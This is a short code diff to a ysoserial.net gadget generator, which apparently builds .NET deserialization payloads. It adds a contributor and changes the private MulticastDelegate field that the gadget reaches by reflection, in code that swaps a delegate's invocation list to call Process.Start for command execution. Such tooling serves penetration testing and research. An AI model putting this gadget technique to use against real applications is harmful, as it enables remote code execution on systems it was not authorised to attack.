@@ -25,7 +25,7 @@ namespace ysoserial.Generators
         
         public override string Contributors()
         {
-            return "Denis Andzakovic";
+            return "Denis Andzakovic, Soroush Dalili";
         }
 
         public override List<string> Labels()
@@ -76,7 +76,7 @@ namespace ysoserial.Generators
                 set.Add(""); // this is needed (as Process.Start accepts two args)
             }
 
-            FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
+            FieldInfo fi = typeof(MulticastDelegate).GetField("delegates", BindingFlags.NonPublic | BindingFlags.Instance);
             object[] invoke_list = d.GetInvocationList();
             // Modify the invocation list to add Process::Start(string, string)
             invoke_list[0] = new Func<string, string, Process>(Process.Start);
